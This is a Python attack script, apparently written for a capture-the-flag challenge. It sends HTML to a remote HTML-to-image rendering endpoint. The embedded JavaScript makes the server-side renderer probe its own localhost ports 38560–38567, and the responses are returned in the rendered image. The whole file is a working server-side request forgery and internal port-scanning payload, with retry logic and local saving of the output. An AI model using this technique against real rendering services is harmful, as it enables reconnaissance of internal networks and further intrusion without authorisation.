import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(3):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=60)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/pt_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:200]}')
            return
        except Exception as e:
            print('retry', e); time.sleep(2)

# Just scan which helper ports respond to /status (fast, no session)
js = r'''<!doctype html><html><head><style>body{font-family:monospace;font-size:14px;white-space:pre-wrap;padding:10px}</style></head><body><div id=o></div><script>
function log(m){document.getElementById('o').textContent += m + "\n";}
function xhr(u){var x=new XMLHttpRequest();x.open("GET",u,false);try{x.send();}catch(e){return -1+"|"+e;}return x.status+"|"+x.responseText.substring(0,80);}
for(var p=38560;p<=38567;p++){
  var r=xhr("http://localhost:"+p+"/status");
  log(p+" => "+r);
}
</script></body></html>'''
render(js, 'portscan')
